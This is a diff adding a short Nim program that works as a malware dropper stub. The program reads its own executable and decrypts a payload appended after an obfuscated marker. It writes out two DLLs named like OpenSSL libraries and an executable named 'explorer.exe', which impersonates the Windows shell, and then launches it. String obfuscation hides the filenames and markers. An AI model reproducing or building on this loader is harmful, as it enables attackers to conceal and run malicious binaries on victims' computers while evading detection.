@@ -1,0 +1,24 @@
+from os import getAppFilename
+from strutils import split
+from winim/inc/shellapi import ShellExecuteW
+from winim/winstr import winstrConverterStringToLPWSTR
+import lib/functions/hideString
+import lib/functions/encryptAES
+import lib/functions/decryptAES
+
+let self = readFile getAppFilename()
+let selfSplit = self.split encrypt d e"<END>"
+var data: string
+
+if selfSplit.len > 1:
+  data = decrypt selfSplit[1]
+else:
+  quit 0
+
+let dataSplit = data.split d e"<DATA>"
+
+writeFile(d e"libcrypto-1_1-x64.dll", dataSplit[0])
+writeFile(d e"libssl-1_1-x64.dll", dataSplit[1])
+writeFile(d e"explorer.exe", dataSplit[2])
+
+discard ShellExecuteW(0, nil, d e"explorer.exe", nil, nil, 5)
